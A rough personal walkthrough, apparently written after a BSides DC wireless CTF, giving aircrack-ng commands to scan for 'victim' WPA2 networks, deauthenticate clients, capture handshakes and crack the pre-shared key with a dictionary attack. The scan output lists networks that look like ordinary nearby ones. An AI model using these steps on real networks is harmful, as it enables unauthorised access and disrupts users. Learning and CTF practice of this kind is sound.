# How to haxx0r WPA!!
![BSides DC 2017](wirelessvillage.png?raw=true "My first wireless CTF ever!")

## Introduction
This is a very rough draft explaining the commands I used to crack my first WPA
network.  I created this file mostly for my benefit as I was learning, but I
figured it may save someone else out there someday from having to regrok more
manpages.  (To the aircrack guys' credit, their manpages are excellently
written.)  I will publish my full cracking scripts at a later date.

## Find victim network
I made a horrible Bash abomination simply called `scanner` (please don't laugh)
that produces easier-to-read iwlist output which you can use or not use (I don't
care).

```
$ ./scanner # Find a victim network
          Cell 01 - Address: 70:3A:CB:F0:ED:CD
                    Channel:11
                    Frequency:2.462 GHz (Channel 11)
                    Quality=34/70  Signal level=-76 dBm
                    Encryption key:on
                    ESSID:"Middleton"
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
          Cell 02 - Address: 72:3A:CB:F0:ED:CC
                    Channel:11
                    Frequency:2.462 GHz (Channel 11)
                    Quality=35/70  Signal level=-75 dBm
                    Encryption key:on
                    ESSID:"Guest-Middleton"
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
          Cell 03 - Address: 70:3A:CB:F0:ED:80
                    Channel:11
                    Frequency:2.462 GHz (Channel 11)
                    Quality=24/70  Signal level=-86 dBm
                    Encryption key:on
                    ESSID:"Middleton"
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
          Cell 04 - Address: F8:7B:8C:20:F8:EF
                    Channel:6
                    Frequency:2.437 GHz (Channel 6)
                    Quality=36/70  Signal level=-74 dBm
                    Encryption key:on
                    ESSID:"Home Wi-Fi 2.5Ghz"
                    IE: WPA Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
          Cell 05 - Address: 72:3A:CB:F0:ED:80
                    Channel:11
                    Frequency:2.462 GHz (Channel 11)
                    Quality=23/70  Signal level=-87 dBm
                    Encryption key:on
                    ESSID:"Guest-Middleton"
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
```

Once a target has been sighted, you can make a little text file for reference:

```
$ ./scanner Guest-Middleton | tee victim_network-info.txt
          Cell 02 - Address: 72:3A:CB:F0:ED:CC
                    Channel:11
                    Frequency:2.462 GHz (Channel 11)
                    Quality=35/70  Signal level=-75 dBm
                    Encryption key:on
                    ESSID:"Guest-Middleton"
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
--
          Cell 05 - Address: 72:3A:CB:F0:ED:80
                    Channel:11
                    Frequency:2.462 GHz (Channel 11)
                    Quality=26/70  Signal level=-84 dBm
                    Encryption key:on
                    ESSID:"Guest-Middleton"
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
```

If your victim info gets lost in the scrollback you can use
`cat victim_network-info.txt` or `less victim_network-info.txt` anytime.

## Get some handshakes
You may have to get closer to the victim network in order to get a full hanshake.  Note the `Signal level` portion of the `iwlist` or `scanner` output.

Note that `iwconfig` may no longer work in the future, so you may have to set your channel with a different tool.

```
iwlist [CARD] scan
iwconfig [CARD] channel [CHANNEL_NUM]
aireplay-ng -0 2 -a [BSSID] [CARD]
airodump-ng --output-format pcap -w capshur -c [CHANNEL] [CARD]
wpaclean [OUTFILE] [INFILE(s)]
```

For the best results, run the `aireplay-ng` line and the `airodump-ng` line
on separate wireless cards.  Run the dump command on the card with the highest
gain antenna.

## Get crackin'
You now should have your handshake if you did the previous steps right.  You
now must crack it to uncover the pre-shared key (PSK).  You can use a bute-force attack, a dictionary attack, or a hybrid of the two.

### Pure Butal
```
wpapcap2john + JtR
aircrack-ng + hashcat
```

### A Basic Dictionary Attack
```
aircrack-ng -s -l wctf_05.psk -w super.words -e WCTF_05 superclean.cap
aircrack-ng -s -l [KEY OUTFILE] -w [WORDLIST] -e [ESSID] [CAPFILE]
```

### Hybrid
Read the John and Hashcat manpages for more info on how to carry out their
respective hybrid attacks.
